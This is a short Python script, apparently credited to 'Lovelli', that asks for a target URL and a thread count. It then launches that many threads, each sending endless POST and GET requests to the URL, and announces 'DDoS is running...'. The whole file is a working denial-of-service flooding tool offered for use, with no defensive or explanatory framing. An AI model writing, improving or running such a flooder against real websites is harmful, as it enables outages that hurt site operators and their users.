import requests
from os import system
from threading import Thread

system("clear")

url = input('Url: ')
thrnom = input('Streams: ')

__Autor__ = "Lovelli"

def ddos():
    while(1<10):

        spam = requests.post(url)
        spam2 = requests.get(url)

for i in range(int(thrnom)):

    thr = Thread(target = ddos)
    thr.start()

print('DDoS is running...')
